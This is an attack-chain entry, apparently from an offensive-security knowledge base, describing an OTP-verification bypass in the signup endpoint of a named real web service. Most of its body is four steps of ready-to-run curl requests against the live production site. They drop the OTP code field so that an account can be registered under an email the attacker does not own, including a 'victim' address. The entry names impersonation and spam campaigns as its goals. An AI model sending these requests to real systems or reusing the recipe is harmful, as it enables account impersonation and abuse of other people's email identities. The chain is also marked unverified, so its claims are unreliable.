---
id: ac-hover-otp-bypass-001
tags:
  - business-logic
  - otp-bypass
  - auth-bypass
  - signup-vulnerability
  - impersonation
type: attack_chain
tools: []
tactics:
  - '[[Initial Access]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/Bypass-OTP-Verification-in-Signup-Endpoint]]'
step_count: 4
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:28:36.490Z'
description: >-
  A multi-step attack exploiting a business logic error in the OTP verification
  process during account signup on hover.com, allowing registration without
  email ownership verification.
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Business Logic Flaw: Bypass OTP Verification in Hover.com Account Signup

Multi-stage attack chain demonstrating a complete attack workflow exploiting a backend failure to enforce OTP code during signup on hover.com.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 4 |
| Execution Time | ~5 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Prepare Signup Request] --> B[Send Normal Signup with OTP]
    B --> C[Modify Request to Omit OTP Code]
    C --> D[Submit Bypassed Request]
    D --> E[Verify Successful Registration]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#3498db
    style D fill:#27ae60
    style E fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- Web browser or API testing tool like curl or Postman

### Target Environment

- Web platform
- Access to hover.com signup endpoint (POST /signup)
- No specific ports required; standard HTTPS (443)

### Initial Access Requirements

- No prior credentials needed
- Public internet access to www.hover.com
- Ability to send HTTP POST requests

## Detailed Attack Procedures

### Step 1: Prepare Normal Signup Request
procedure: [[procedures/Bypass-OTP-Verification-in-Signup-Endpoint]]

**Objective**: Establish a baseline by sending a standard signup request that includes the OTP code to understand the normal flow.

**Instructions**: Use a tool like curl to send a POST request to the /signup endpoint with all required fields, including a valid OTP code obtained via email.

```bash
curl -X POST https://www.hover.com/signup \
  -H "Host: www.hover.com" \
  -H "Content-Type: application/json;charset=UTF-8" \
  -d '{"account":{"first_name":"Test","last_name":"User","email":"test@example.com","username":"testuser","password":"SecurePass123","terms_version":"1","tosValues":true,"code":"624187"}}'
```

**Expected Output**: HTTP 200 OK with JSON response {"success": true}, confirming registration if OTP is valid.

**Success Indicators**:
- Request accepted with OTP
- Account creation succeeds in normal flow

### Step 2: Modify Request to Bypass OTP
procedure: [[procedures/Bypass-OTP-Verification-in-Signup-Endpoint]]

**Objective**: Exploit the business logic flaw by omitting the 'code' parameter, testing if the backend enforces OTP validation.

**Instructions**: Remove the 'code' field from the JSON body while keeping all other parameters intact, then resend the request.

```bash
curl -X POST https://www.hover.com/signup \
  -H "Host: www.hover.com" \
  -H "Content-Type: application/json;charset=UTF-8" \
  -d '{"account":{"first_name":"Test","last_name":"User","email":"test@example.com","username":"testuser","password":"SecurePass123","terms_version":"1","tosValues":true}}'
```

**Expected Output**: HTTP/2 200 OK with JSON {"success": true}, indicating registration without OTP.

**Success Indicators**:
- No error for missing 'code'
- Successful response despite omission

### Step 3: Submit Bypassed Signup Request
procedure: [[procedures/Bypass-OTP-Verification-in-Signup-Endpoint]]

**Objective**: Confirm the bypass works by completing registration with an arbitrary email not owned by the attacker.

**Instructions**: Use the modified request from Step 2, targeting an email like a victim's or arbitrary one, and submit.

```bash
curl -X POST https://www.hover.com/signup \
  -H "Host: www.hover.com" \
  -H "Content-Type: application/json;charset=UTF-8" \
  -d '{"account":{"first_name":"Victim","last_name":"Impersonated","email":"victim@real.com","username":"fakevictim","password":"HackedPass123","terms_version":"1","tosValues":true}}'
```

**Expected Output**: HTTP 200 OK and session token returned, account created.

**Success Indicators**:
- Account registered without email verification
- Valid session established

### Step 4: Verify Registration Success
procedure: [[procedures/Bypass-OTP-Verification-in-Signup-Endpoint]]

**Objective**: Validate the impact by checking if the account is active and email confirmation is bypassed.

**Instructions**: Attempt to log in with the new credentials or check for any email notifications; no OTP email should have been required.

**Expected Output**: Successful login or dashboard access; optional email check shows no OTP sent or required.

**Success Indicators**:
- Account usable without owning the email
- Potential for spam or impersonation confirmed

## Attack Chain Summary

### Key Achievements

1. Successfully bypassed OTP verification during signup
2. Registered account with arbitrary email, enabling impersonation
3. Demonstrated scalability for abuse like spam campaigns
4. Highlighted risk to legitimate users being blocked from their emails

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Exploit Public-Facing Application]]

### MITRE ATT&CK Tactics

- [[Initial Access]]

---
*Last updated: 2023-10-01T00:00:00Z*
